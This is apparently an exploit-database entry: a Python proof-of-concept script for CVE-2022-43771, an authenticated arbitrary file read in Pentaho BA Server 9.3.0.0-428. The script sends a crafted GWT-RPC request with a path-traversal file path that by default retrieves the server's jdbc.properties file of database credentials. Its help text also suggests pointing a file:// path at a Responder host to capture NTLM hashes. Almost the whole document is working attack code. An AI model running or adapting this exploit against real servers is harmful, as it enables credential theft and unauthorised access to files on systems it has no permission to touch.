# Title: Pentaho BA Server EE 9.3.0.0-428 - Arbitrary File Read (Authenticated)
# Author: dwbzn
# Date: ####
# Vendor: https://www.hitachivantara.com/
# Software Link: https://www.hitachivantara.com/en-us/products/lumada-dataops/data-integration-analytics/download-pentaho.html
# Version: Pentaho BA Server 9.3.0.0-428
# CVE: CVE-2022-43771
# Tested on: Windows 11
# Credits: https://research.aurainfosec.io/pentest/pentah0wnage

# Authenticated File Read (https://research.aurainfosec.io/pentah0wnage)
import requests
import argparse
import re


parser = argparse.ArgumentParser(description='CVE-XXXX - Authenticated File Read in Pentaho BA Server via Mondrian Analytics\n\nUse file:////<host running responder> to grab NTLM hashes', formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('baseurl', type=str, help='base url e.g. http://127.0.0.1:8080/pentaho')
parser.add_argument('-j', metavar='JSESSIONID', type=str, help='JSESSIONID of user with Manage Data Source privileges', required=True)
parser.add_argument('-f', metavar='file', default='../../../system/simple-jndi/jdbc.properties', nargs='?', type=str, help='relative path of file to retrieve', required=False)


args = parser.parse_args()

session = requests.session()
session.cookies.set("JSESSIONID",value=args.j)

req = session.request(method='post', url=f'{args.baseurl}/gwtrpc/CsvDatasourceService', data=f'7|0|9||1|org.pentaho.platform.dataaccess.datasource.wizard.service.gwt.ICsvDatasourceService|getPreviewRows|java.lang.String/2004016611|Z|I|{args.f}|UTF-8|1|2|3|4|4|5|6|7|5|8|0|1000|9|', headers={"Content-Type":"text/x-gwt-rpc","X-GWT-Permutation":"1"})

resulttext = re.search('(?<=\[)"java.*"(?=\])',req.text).group(0).replace('\\u003D','=')
list = resulttext.split('","')
print("\n".join(list)[59:-1])